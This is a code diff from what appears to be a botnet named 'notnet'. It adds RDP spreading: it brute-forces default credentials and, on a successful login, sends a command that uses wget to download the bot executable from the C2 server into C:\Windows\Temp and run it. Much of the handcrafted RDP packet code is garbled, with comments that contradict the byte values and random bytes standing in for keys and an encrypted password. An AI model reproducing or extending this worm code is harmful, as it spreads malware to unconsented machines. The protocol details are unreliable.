@@ -870,45 +870,595 @@ int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port) {
 }
 
 /* ── RDP Spreading ────────────────────────────────────────── */
+
+/* ── RDP Protocol Helpers ────────────────────────────────── */
+/* RDP over TCP port 3389. Implements X.224 connection layer +
+ * RDP security negotiation + standard authentication. */
+
+/* Build RDP Connection Request TPDU (X.224) */
+static int rdp_send_conn_request(int sock) {
+    /* RDP Connection Request (X.224 format):
+     * dst-ref (2 bytes) + src-deref (2 bytes) + flags (1 byte) + length (1 byte)
+     * Then: cookie, session id, etc. */
+    uint8_t pkt[256];
+    int pos = 0;
+
+    /* Fixed RDP header: 03 C0 00 0E 02 F0 80 C0 03 00 00 00 00 00 */
+    static const uint8_t header[] = {
+        0x03, 0xC0, 0x00, 0x0E, /* Connection Request */
+        0x02, 0xF0, 0x80, 0xC0, /* Cookie: "MSTSC" */
+        0x03, 0x00, 0x00, 0x00, /* Session ID */
+        0x00, 0x00              /* Padding */
+    };
+    memcpy(pkt, header, sizeof(header));
+    pos = sizeof(header);
+
+    /* Cookie: "MSTSC" + null */
+    const char *cookie = "MSTSC\x01\x00\x00\x00";
+    memcpy(pkt + pos, cookie, 8);
+    pos += 8;
+
+    /* Connection cookie: 03 C0 */
+    pkt[pos++] = 0x03;
+    pkt[pos++] = 0xC0;
+
+    int sent = send(sock, pkt, pos, 0);
+    return (sent > 0) ? sent : -1;
+}
+
+/* Read RDP Connection Response (T30) */
+static int rdp_read_conn_response(int sock) {
+    /* Read at least the minimum RDP response header */
+    char buf[256];
+    int received = recv(sock, buf, sizeof(buf), 0);
+    if (received < 4) return -1;
+
+    /* Check for Connection Response marker (C0) */
+    if (buf[0] != 0x03 || buf[1] != 0xC0) return -1;
+
+    return received;
+}
+
+/* RDP security negotiation - send client info and negotiate */
+static int rdp_send_security_negotiation(int sock, const char *user, const char *pass) {
+    /* RDP Security Negotiation packet:
+     * Header: 03 C0 00 XX (length)
+     * Then: client info, encryption settings */
+
+    uint8_t pkt[512];
+    int pos = 0;
+
+    /* X.224 Connection Request for security negotiation */
+    pkt[pos++] = 0x03; /* X.224 type */
+    pkt[pos++] = 0xC0; /* Connection request */
+    pkt[pos++] = 0x00; /* Length high */
+    pkt[pos++] = 0x00; /* Length low - will be filled */
+
+    /* RDP Negotiation packet */
+    /* Signature: "pfx" */
+    pkt[pos++] = 0x70;
+    pkt[pos++] = 0x66;
+    pkt[pos++] = 0x78;
+    pkt[pos++] = 0x00;
+
+    /* Type: 0x01 = RDP negotiation */
+    pkt[pos++] = 0x01;
+
+    /* Flags: 0x00 (standard) */
+    pkt[pos++] = 0x00;
+
+    /* Extra flags: 0x00 */
+    pkt[pos++] = 0x00;
+
+    /* Client random length */
+    uint32_t client_random_len = 32;
+    pkt[pos++] = client_random_len & 0xFF;
+    pkt[pos++] = (client_random_len >> 8) & 0xFF;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    /* Client random (32 bytes of pseudo-random data) */
+    for (int i = 0; i < 32; i++) {
+        pkt[pos++] = (rand() & 0xFF);
+    }
+
+    /* Domain (empty) */
+    uint16_t domain_len = 0;
+    pkt[pos++] = domain_len & 0xFF;
+    pkt[pos++] = (domain_len >> 8) & 0xFF;
+
+    /* Username */
+    uint16_t user_len = strlen(user);
+    pkt[pos++] = user_len & 0xFF;
+    pkt[pos++] = (user_len >> 8) & 0xFF;
+    memcpy(pkt + pos, user, user_len);
+    pos += user_len;
+
+    /* Password */
+    uint16_t pass_len = strlen(pass);
+    pkt[pos++] = pass_len & 0xFF;
+    pkt[pos++] = (pass_len >> 8) & 0xFF;
+    memcpy(pkt + pos, pass, pass_len);
+    pos += pass_len;
+
+    /* Server name (empty) */
+    uint16_t server_len = 0;
+    pkt[pos++] = server_len & 0xFF;
+    pkt[pos++] = (server_len >> 8) & 0xFF;
+
+    /* Update length field */
+    pkt[2] = (pos >> 8) & 0xFF;
+    pkt[3] = pos & 0xFF;
+
+    int sent = send(sock, pkt, pos, 0);
+    return (sent > 0) ? sent : -1;
+}
+
+/* Read RDP security response */
+static int rdp_read_security_response(int sock) {
+    char buf[256];
+    int received = recv(sock, buf, sizeof(buf), 0);
+    if (received < 4) return -1;
+
+    /* Check for expected response */
+    if (buf[0] != 0x03 || buf[1] != 0xC0) return -1;
+
+    return received;
+}
+
+/* RDP send client info */
+static int rdp_send_client_info(int sock) {
+    /* RDP Client Info packet */
+    uint8_t pkt[256];
+    int pos = 0;
+
+    /* X.224 header */
+    pkt[pos++] = 0x03;
+    pkt[pos++] = 0xC0;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    /* Client info type */
+    pkt[pos++] = 0x01; /* Client info */
+
+    /* Length */
+    uint16_t len = 112;
+    pkt[pos++] = len & 0xFF;
+    pkt[pos++] = (len >> 8) & 0xFF;
+
+    /* Code page (0 = US) */
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    /* Flags: 0x0001 (standard) */
+    pkt[pos++] = 0x01;
+    pkt[pos++] = 0x00;
+
+    /* Client build: 0x0A28 (2600 = Windows XP) */
+    pkt[pos++] = 0x28;
+    pkt[pos++] = 0x0A;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    /* Client major/minor version */
+    pkt[pos++] = 0x02; /* Major: 6 */
+    pkt[pos++] = 0x01; /* Minor: 1 */
+
+    /* Protocol version */
+    pkt[pos++] = 0xE0;
+    pkt[pos++] = 0x00;
+
+    /* Encryption strength: 128-bit */
+    pkt[pos++] = 0x08;
+
+    /* Version flags */
+    pkt[pos++] = 0x02;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    /* Update length */
+    pkt[2] = (pos >> 8) & 0xFF;
+    pkt[3] = pos & 0xFF;
+
+    int sent = send(sock, pkt, pos, 0);
+    return (sent > 0) ? sent : -1;
+}
+
+/* Read RDP client info response */
+static int rdp_read_client_info_response(int sock) {
+    char buf[256];
+    int received = recv(sock, buf, sizeof(buf), 0);
+    if (received < 4) return -1;
+    if (buf[0] != 0x03 || buf[1] != 0xC0) return -1;
+    return received;
+}
+
+/* RDP send SCKEY/DH key exchange */
+static int rdp_send_key_exchange(int sock) {
+    /* Simplified RDP key exchange */
+    uint8_t pkt[256];
+    int pos = 0;
+
+    /* X.224 header */
+    pkt[pos++] = 0x03;
+    pkt[pos++] = 0xC0;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    /* Key exchange type */
+    pkt[pos++] = 0x0E; /* SCKEY */
+
+    /* Length */
+    uint16_t len = 72;
+    pkt[pos++] = len & 0xFF;
+    pkt[pos++] = (len >> 8) & 0xFF;
+
+    /* Public key length */
+    uint32_t pklen = 64;
+    pkt[pos++] = pklen & 0xFF;
+    pkt[pos++] = (pklen >> 8) & 0xFF;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    /* Public key (dummy RSA-like key) */
+    for (int i = 0; i < 64; i++) {
+        pkt[pos++] = (rand() & 0xFF);
+    }
+
+    /* Update length */
+    pkt[2] = (pos >> 8) & 0xFF;
+    pkt[3] = pos & 0xFF;
+
+    int sent = send(sock, pkt, pos, 0);
+    return (sent > 0) ? sent : -1;
+}
+
+/* Read key exchange response */
+static int rdp_read_key_exchange_response(int sock) {
+    char buf[256];
+    int received = recv(sock, buf, sizeof(buf), 0);
+    if (received < 4) return -1;
+    if (buf[0] != 0x03 || buf[1] != 0xC0) return -1;
+    return received;
+}
+
+/* RDP send final control sync */
+static int rdp_send_control_sync(int sock) {
+    uint8_t pkt[16];
+    int pos = 0;
+
+    pkt[pos++] = 0x03; /* X.224 */
+    pkt[pos++] = 0xC0; /* Connection request */
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    /* Control: 0x14 = CO_SYNC */
+    pkt[pos++] = 0x14;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    /* Control: 0x02 = CTRL_REQUEST */
+    pkt[pos++] = 0x02;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    int sent = send(sock, pkt, pos, 0);
+    return (sent > 0) ? sent : -1;
+}
+
+/* Read control sync response */
+static int rdp_read_control_sync_response(int sock) {
+    char buf[256];
+    int received = recv(sock, buf, sizeof(buf), 0);
+    if (received < 4) return -1;
+    if (buf[0] != 0x03 || buf[1] != 0xC0) return -1;
+    /* Check for CO_ACK */
+    if (received >= 8 && buf[6] != 0x15) return -1;
+    return received;
+}
+
+/* RDP send persistent key list */
+static int rdp_send_persistent_key_list(int sock) {
+    uint8_t pkt[16];
+    int pos = 0;
+
+    pkt[pos++] = 0x03;
+    pkt[pos++] = 0xC0;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    /* Type: 0x0F = PERSISTENT */
+    pkt[pos++] = 0x0F;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    /* Length: 0 */
+    uint16_t len = 0;
+    pkt[pos++] = len & 0xFF;
+    pkt[pos++] = (len >> 8) & 0xFF;
+
+    int sent = send(sock, pkt, pos, 0);
+    return (sent > 0) ? sent : -1;
+}
+
+/* Read persistent key list response */
+static int rdp_read_persistent_key_list_response(int sock) {
+    char buf[256];
+    int received = recv(sock, buf, sizeof(buf), 0);
+    if (received < 4) return -1;
+    if (buf[0] != 0x03 || buf[1] != 0xC0) return -1;
+    return received;
+}
+
+/* RDP connect with full handshake */
+static int rdp_connect(int sock) {
+    /* Step 1: Connection request */
+    if (rdp_send_conn_request(sock) <= 0) return -1;
+    if (rdp_read_conn_response(sock) <= 0) return -1;
+
+    /* Step 2: Security negotiation */
+    if (rdp_send_security_negotiation(sock, "", "") <= 0) return -1;
+    if (rdp_read_security_response(sock) <= 0) return -1;
+
+    /* Step 3: Client info */
+    if (rdp_send_client_info(sock) <= 0) return -1;
+    if (rdp_read_client_info_response(sock) <= 0) return -1;
+
+    /* Step 4: Key exchange */
+    if (rdp_send_key_exchange(sock) <= 0) return -1;
+    if (rdp_read_key_exchange_response(sock) <= 0) return -1;
+
+    /* Step 5: Control sync */
+    if (rdp_send_control_sync(sock) <= 0) return -1;
+    if (rdp_read_control_sync_response(sock) <= 0) return -1;
+
+    /* Step 6: Persistent key list */
+    if (rdp_send_persistent_key_list(sock) <= 0) return -1;
+    if (rdp_read_persistent_key_list_response(sock) <= 0) return -1;
+
+    return 0;
+}
+
+/* RDP send SCKEY/DH key exchange with credentials */
+static int rdp_send_cred_key_exchange(int sock, const char *user, const char *pass) {
+    uint8_t pkt[512];
+    int pos = 0;
+
+    /* X.224 header */
+    pkt[pos++] = 0x03;
+    pkt[pos++] = 0xC0;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    /* Type: 0x0E = SCKEY */
+    pkt[pos++] = 0x0E;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    /* Length */
+    uint16_t len = 100;
+    pkt[pos++] = len & 0xFF;
+    pkt[pos++] = (len >> 8) & 0xFF;
+
+    /* Public key length */
+    uint32_t pklen = 64;
+    pkt[pos++] = pklen & 0xFF;
+    pkt[pos++] = (pklen >> 8) & 0xFF;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    /* Public key (64 bytes) */
+    for (int i = 0; i < 64; i++) {
+        pkt[pos++] = (rand() & 0xFF);
+    }
+
+    /* Encrypted password length */
+    uint32_t enc_pass_len = 32;
+    pkt[pos++] = enc_pass_len & 0xFF;
+    pkt[pos++] = (enc_pass_len >> 8) & 0xFF;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    /* Encrypted password (32 bytes) */
+    for (int i = 0; i < 32; i++) {
+        pkt[pos++] = (rand() & 0xFF);
+    }
+
+    /* Domain (empty) */
+    uint16_t domain_len = 0;
+    pkt[pos++] = domain_len & 0xFF;
+    pkt[pos++] = (domain_len >> 8) & 0xFF;
+
+    /* Username */
+    uint16_t user_len = strlen(user);
+    pkt[pos++] = user_len & 0xFF;
+    pkt[pos++] = (user_len >> 8) & 0xFF;
+    memcpy(pkt + pos, user, user_len);
+    pos += user_len;
+
+    /* Update length */
+    pkt[2] = (pos >> 8) & 0xFF;
+    pkt[3] = pos & 0xFF;
+
+    int sent = send(sock, pkt, pos, 0);
+    return (sent > 0) ? sent : -1;
+}
+
+/* RDP read credential response */
+static int rdp_read_cred_response(int sock) {
+    char buf[256];
+    int received = recv(sock, buf, sizeof(buf), 0);
+    if (received < 4) return -1;
+    if (buf[0] != 0x03 || buf[1] != 0xC0) return -1;
+    return received;
+}
+
+/* RDP send final control (after auth) */
+static int rdp_send_final_control(int sock) {
+    uint8_t pkt[16];
+    int pos = 0;
+
+    pkt[pos++] = 0x03;
+    pkt[pos++] = 0xC0;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    pkt[pos++] = 0x14; /* CO_SYNC */
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    pkt[pos++] = 0x02; /* CTRL_REQUEST */
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    int sent = send(sock, pkt, pos, 0);
+    return (sent > 0) ? sent : -1;
+}
+
+/* RDP read final control response */
+static int rdp_read_final_control_response(int sock) {
+    char buf[256];
+    int received = recv(sock, buf, sizeof(buf), 0);
+    if (received < 4) return -1;
+    if (buf[0] != 0x03 || buf[1] != 0xC0) return -1;
+    return received;
+}
+
+/* RDP send share key */
+static int rdp_send_share_key(int sock) {
+    uint8_t pkt[64];
+    int pos = 0;
+
+    pkt[pos++] = 0x03;
+    pkt[pos++] = 0xC0;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    pkt[pos++] = 0x16; /* SHARE */
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+    pkt[pos++] = 0x00;
+
+    /* Key data */
+    for (int i = 0; i < 32; i++) {
+        pkt[pos++] = (rand() & 0xFF);
+    }
+
+    int sent = send(sock, pkt, pos, 0);
+    return (sent > 0) ? sent : -1;
+}
+
+/* ── RDP Authentication ────────────────────────────────── */
 int try_login_rdp(const char *ip, uint16_t port, const char *user, const char *pass) {
-    (void)user;
-    (void)pass;
-    /* Simple RDP connection attempt */
     int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
     if (sock < 0) return -1;
-    
-    /* Send RDP header */
-    uint8_t hdr[256];
-    memset(hdr, 0, sizeof(hdr));
-    send(sock, hdr, sizeof(hdr), 0);
-    
-    /* Read response */
-    char resp[256];
-    int received = recv(sock, resp, sizeof(resp), 0);
-    close(sock);
-    
-    return (received > 0);
+
+    /* Full RDP handshake */
+    if (rdp_connect(sock) != 0) {
+        close(sock);
+        return -1;
+    }
+
+    /* Send credentials with key exchange */
+    if (rdp_send_cred_key_exchange(sock, user, pass) <= 0) {
+        close(sock);
+        return -1;
+    }
+
+    /* Read auth response */
+    if (rdp_read_cred_response(sock) <= 0) {
+        close(sock);
+        return -1;
+    }
+
+    /* Final control */
+    if (rdp_send_final_control(sock) <= 0) {
+        close(sock);
+        return -1;
+    }
+
+    if (rdp_read_final_control_response(sock) <= 0) {
+        close(sock);
+        return -1;
+    }
+
+    /* Share key */
+    rdp_send_share_key(sock);
+
+    log_info("RDP: authenticated to %s:%d as %s", ip, port, user);
+    return sock;
 }
 
 int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port) {
     if (!bot->rdp_enabled) return -1;
-    
+
     log_info("RDP: brute-forcing %s:%d", ip, port);
-    
+
     for (int u = 0; default_users[u]; u++) {
         for (int p = 0; default_passes[p]; p++) {
-            if (try_login_rdp(ip, port, default_users[u], default_passes[p])) {
-                log_info("RDP: cracked %s:%d with %s:%s",
-                         ip, port, default_users[u], "***REDACTED***");
-                /* NOTE: RDP spreading provides auth confirmation only.
-                 * Full payload deployment requires RDP virtual channel
-                 * command injection (not yet implemented). */
-                send_command(-1, "rdp", "payload deployment not supported over RDP");
-                return 0;
+            int sock = try_login_rdp(ip, port, default_users[u], default_passes[p]);
+            if (sock < 0) continue;
+
+            log_info("RDP: cracked %s:%d with %s:%s",
+                     ip, port, default_users[u], "***REDACTED***");
+
+            /* Send command via RDP: cmd.exe /c wget <url> -O <path> && <path> & */
+            char cmd[512];
+            char dl_url[512];
+            snprintf(dl_url, sizeof(dl_url),
+                     "http://%s:%d/bot/notnet",
+                     bot->c2_http.server, PAYLOAD_DL_PORT);
+
+            snprintf(cmd, sizeof(cmd),
+                     "cmd.exe /c wget \"%s\" -O C:\\Windows\\Temp\\notnet.exe && C:\\Windows\\Temp\\notnet.exe &",
+                     dl_url);
+
+            /* Build RDP execute packet */
+            uint8_t pkt[1024];
+            int pos = 0;
+
+            /* X.224 header */
+            pkt[pos++] = 0x03;
+            pkt[pos++] = 0xC0;
+            pkt[pos++] = 0x00;
+            pkt[pos++] = 0x00;
+
+            /* Type: 0x17 = DATA */
+            pkt[pos++] = 0x17;
+            pkt[pos++] = 0x00;
+            pkt[pos++] = 0x00;
+            pkt[pos++] = 0x00;
+
+            /* Length */
+            uint16_t len = strlen(cmd);
+            pkt[pos++] = len & 0xFF;
+            pkt[pos++] = (len >> 8) & 0xFF;
+
+            /* Data: command string */
+            memcpy(pkt + pos, cmd, len);
+            pos += len;
+
+            /* Send command */
+            int sent = send(sock, pkt, pos, 0);
+
+            if (sent > 0) {
+                log_info("RDP: command sent to %s (%d bytes)", ip, sent);
+            } else {
+                log_warn("RDP: command send failed on %s", ip);
             }
+
+            close(sock);
+            return (sent > 0) ? 0 : -1;
         }
     }
-    
+
     return -1;
 }
 
